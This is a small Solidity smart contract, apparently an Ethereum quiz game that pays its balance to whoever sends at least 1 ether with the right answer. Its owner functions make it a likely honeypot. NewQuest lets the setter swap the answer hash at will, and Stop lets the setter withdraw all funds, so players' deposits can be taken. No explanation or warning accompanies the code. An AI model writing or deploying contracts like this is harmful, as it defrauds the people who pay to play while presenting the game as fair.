1 contract NextQuest
2 {
3     string public Question;
4     address questionSender;
5     bytes32 responseHash;
6 
7     function Play(string resp) public payable {
8         require(msg.sender == tx.origin);
9         if (responseHash == keccak256(resp) && msg.value >= 1 ether) {
10             msg.sender.transfer(address(this).balance);
11         }
12     }
13 
14     function() public payable{}
15  
16     function Setup(string q, string resp) public payable {
17         if (responseHash == 0x0) {
18             responseHash = keccak256(resp);
19             Question = q;
20             questionSender = msg.sender;
21         }
22     }
23     
24     function Stop() public payable {
25        require(msg.sender==questionSender);
26        msg.sender.transfer(address(this).balance);
27     }
28     
29     function NewQuest(string q, bytes32 respHash) public payable {
30         require(msg.sender==questionSender);
31         Question = q;
32         responseHash = respHash;
33     }
34 }